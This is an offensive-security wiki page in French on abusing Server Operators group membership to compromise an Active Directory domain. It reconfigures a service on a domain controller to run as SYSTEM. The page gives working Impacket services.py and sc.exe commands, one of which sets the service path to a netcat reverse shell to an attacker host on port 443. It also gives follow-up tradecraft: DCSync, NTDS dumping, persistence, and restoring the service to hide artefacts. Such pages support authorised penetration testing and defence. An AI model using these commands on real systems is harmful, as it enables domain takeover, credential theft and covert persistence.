---
title: "Server Operators : reconfigurer un service pour qu'il s'exécute en tant que SYSTEM"
order: 10
description: "Exploitation de l'appartenance au groupe Server Operators, qui peut gérer les services sur les contrôleurs de domaine, pour reconfigurer le chemin binaire d'un service vers une commande malveillante et le démarrer en tant que LocalSystem."
keywords:
  - Server Operators
  - reconfiguration de service
  - binPath
  - services.py
  - élévation de privilèges
---

# Server Operators

Les membres de **Server Operators** peuvent ouvrir une session sur les contrôleurs de domaine et y **gérer les services**. Les services Windows s'exécutent par défaut en tant que **LocalSystem**, et le groupe détient suffisamment d'accès pour **reconfigurer le chemin binaire d'un service**. Vous pointez donc un service existant vers une commande de votre choix, vous le démarrez, et cette commande s'exécute en tant que SYSTEM sur le DC, ce qui constitue une compromission du domaine. Comme Backup Operators, c'est Domain Admin sous un autre nom.

## L'attaque

```bash
# From Linux: Impacket services.py reconfigures and runs a service remotely
services.py 'EXAMPLE/svc_srvop:password@<dc>' change -name <service> -path 'C:\Windows\Temp\nc.exe -e cmd.exe <attacker> 443'
services.py 'EXAMPLE/svc_srvop:password@<dc>' start -name <service>
```

```text
# On-host equivalent with sc.exe (member of Server Operators)
sc.exe config <service> binPath= "C:\Windows\Temp\payload.exe"
sc.exe start <service>
```

Choisissez un service que vous pouvez arrêter/démarrer en toute sécurité (ou un service configuré pour s'exécuter à la demande) ; un choix courant à faible impact est un service rarement utilisé que vous rétablissez ensuite. Votre charge utile ajoute généralement un admin de domaine ou renvoie un shell SYSTEM.

## Notes d'exploitation

- La commande s'exécute en tant que **LocalSystem sur le DC**, à partir de là vous faites un DCSync, vous videz [NTDS](../authentication/credentials/ntds-and-dcsync.md), ou vous ajoutez de la persistance.
- **Rétablissez** le `binPath` d'origine ensuite ; un service corrompu est à la fois perturbateur et un artefact évident.
- Server Operators est un groupe **protégé** (gardé par [AdminSDHolder](adminsdholder.md)), vous ne pouvez donc généralement pas vous y ajouter via une ACL faible ; vous l'atteignez en compromettant un membre existant.
- La même idée de « reconfigurer un service SYSTEM » s'applique à tout service dont vous pouvez écrire la DACL (permissions de service faibles), pas seulement via Server Operators.

## Outils

- **Impacket `services.py`** : changement/démarrage de service à distance depuis Linux.
- **sc.exe / PowerShell `Set-Service`** : reconfiguration native en local.
- **NetExec** : exécuter la reconfiguration/le démarrage sur SMB.

## Références

- [Hacking Articles: Server Operator group privilege escalation](https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/)
- [qazeer notes: operators to Domain Admins](https://notes.qazeer.io/active-directory/exploitation-operators_to_domain_admins)
- [HackTricks: privileged groups and token privileges](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html)
